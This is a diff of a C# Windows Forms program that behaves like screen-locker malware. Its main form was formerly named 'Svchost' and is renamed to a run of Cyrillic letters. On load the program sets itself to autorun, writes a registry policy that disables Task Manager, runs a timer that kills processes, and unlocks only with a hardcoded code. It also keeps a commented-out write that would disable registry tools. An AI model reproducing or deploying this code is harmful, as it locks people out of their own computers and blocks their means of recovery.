@@ -15,13 +15,20 @@ using Microsoft.Win32;
 
 namespace WindowsFormsApp2
 {
-    public partial class Svchost : Form
+    public partial class ффффффффффффффффффффф : Form
     {
+        
 
-        public Svchost()
+        int h = DateTime.Now.Hour;
+        int m = DateTime.Now.Minute;
+        int s = DateTime.Now.Second;
+
+        string time = "";
+        public ффффффффффффффффффффф()
         {
             InitializeComponent();
         }
+
 
         private void button4_Click(object sender, EventArgs e)
         {
@@ -104,19 +111,36 @@ namespace WindowsFormsApp2
             }
             return true;//If success
         }
+
+
+
+        public static void Disabletaskmgr(bool val)
+        {
+            if (val == true)
+            {
+                RegistryKey saveKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+                saveKey.SetValue("DisableTaskMgr", "1");
+                saveKey.Close();
+            }
+            else
+            {
+                RegistryKey Deletekey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+                Deletekey.DeleteValue("DisableTaskMgr");
+                Deletekey.Close();
+            }
+        }
+
         private void button1_Click(object sender, EventArgs e)
         {
             if (textBox1.Text == "26381234")
             {
 
-                Process.Start("explorer");
-                SetAutorunValue(false);
+                Process.Start("explorer"); // starting explorer
+                SetAutorunValue(false); // disabling autorun
                 MessageBox.Show("If explorer dont run - run it manuality or reboot pc.");
-                Application.Exit();
+                Application.Exit(); // closing
 
-                RegistryKey Deletekey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
-                Deletekey.DeleteValue("DisableTaskMgr");
-                Deletekey.Close();
+                Disabletaskmgr(false);
             }
             else
             {
@@ -132,14 +156,19 @@ namespace WindowsFormsApp2
             label9.Text = (" " + Environment.OSVersion);
             label10.Text = ("Секунд с момента запуска системы:      " + Environment.TickCount);
             SetAutorunValue(true);
+            Disabletaskmgr(true);
+            timer2.Interval = 1000;
+            timer2.Tick += new EventHandler(timer1_Tick);
+            timer2.Start();
+            
+            
 
-            RegistryKey saveKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
-            saveKey.SetValue("DisableTaskMgr", "1");
-            saveKey.Close();
 
-            RegistryKey saveKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
-            saveKey2.SetValue("DisableRegistryTools", "1");
-            saveKey2.Close();
+
+
+            /*    RegistryKey saveKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+                saveKey2.SetValue("DisableRegistryTools", "1");
+                saveKey2.Close(); */
         }
 
         private void timer1_Tick(object sender, EventArgs e)
@@ -150,5 +179,47 @@ namespace WindowsFormsApp2
                 p.Kill();
             }
         }
+
+        private void timer2_Tick(object sender, EventArgs e)
+        {
+            string time = "";
+            int h = DateTime.Now.Hour;
+            int m = DateTime.Now.Minute;
+            int s = DateTime.Now.Second;
+
+            if (h < 10)
+            {
+                time += "0" + h;
+            }
+            else
+            {
+                time += h;
+            }
+
+            time += ":";
+
+            if (m < 10)
+            {
+                time += "0" + m;
+            }
+            else
+            {
+                time += m;
+            }
+
+            time += ":";
+
+            if (s < 10)
+            {
+                time += "0" + s;
+            }
+            else
+            {
+                time += s;
+            }
+            time += ":";
+            label11.Text = time;
+        }
     }
 }
+
